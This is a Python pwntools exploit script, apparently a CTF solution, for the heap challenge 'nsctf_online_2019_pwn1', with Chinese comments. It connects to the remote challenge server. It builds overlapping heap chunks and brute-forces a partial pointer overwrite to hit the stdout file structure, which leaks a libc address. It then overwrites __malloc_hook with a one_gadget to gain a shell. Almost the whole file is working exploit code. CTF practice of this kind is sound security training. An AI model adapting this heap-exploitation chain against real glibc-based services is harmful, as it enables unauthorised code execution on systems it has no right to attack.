# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './nsctf_online_2019_pwn1'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28993'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('5.exit\n',num)

def add(size,content='a'):
    cmd(1)
    sla('size:',size)
    sa('content:',content)

def delete(id):
    cmd(2)
    sla('index:',id)

def edit(id,size,content):
    cmd(4)
    sla('index:',id)
    sla('size:',size)
    sla('content:',content)

one_gad = one_gadget(libc.path)

# 这题主要是申请大小0x80的 chunk 踩出 libc 后释放进 unsortedbin 再申请更大大小的 chunk 修改 fd 没想到
# 关键是可以！！释放！！这个点
# 之后想到修改 chunk 头去了

def attack():

    add(0x80) #0
    add(0x68) #1
    add(0xF0) #2
    add(0x10) #3

    delete(0)
    edit(1,0x68,'b'*0x60 + p64(0x70 + 0x90))
    delete(2)

    #########################################
    add(0x80,'a') #0
    add(0x68,'b') #2与1重合
    add(0xF0,'c') #4
    delete(0)
    edit(2,0x68,'b'*0x60 + p64(0x70 + 0x90))
    #重新形成overlap chunk
    delete(4)
    #########################################
    # 这里为了形成指针复用，方便后续利用

    delete(1)
    add(0x80) #0
    # 切割 unsortedbin 在chunk1得到 libc 地址
    delete(0)
    # 释放堆块重新合并
    low_addr = 0x95dd

    add(0x80 + 0x10 + 2 , '\x00'*0x80 + flat(0,0x71) + p16(low_addr))
    # 再从 unsortedbin 申请堆块爆破修改 fd
    # 这里修改多少就申请多大，不然会将其他地方置0
    add(0x68) #1

    payload = '\x00'*0x33 + p64(0x0FBAD1887) +p64(0)*3 + p8(0x88)
    add(0x59,payload) #4

    leak = l64()
    lg('leak',leak)
    libc.address = leak - libc.sym['_IO_2_1_stdin_']
    __malloc_hook = libc.sym['__malloc_hook']
    ogg = one_gad[3] + libc.address

    delete(1) #这里用到之前埋下的指针复用伏笔
    edit(2,0x8,p64(__malloc_hook - 0x23))
    add(0x68)
    add(0x68 , '\x00'*0x13 + p64(ogg))

    cmd(1)
    sla('size:',0x20)
    # dbg()

    p.interactive()

exhaust(attack)


'''
@File    :   nsctf_online_2019_pwn1.py
@Time    :   2021/08/20 12:17:52
@Author  :   Niyah 
'''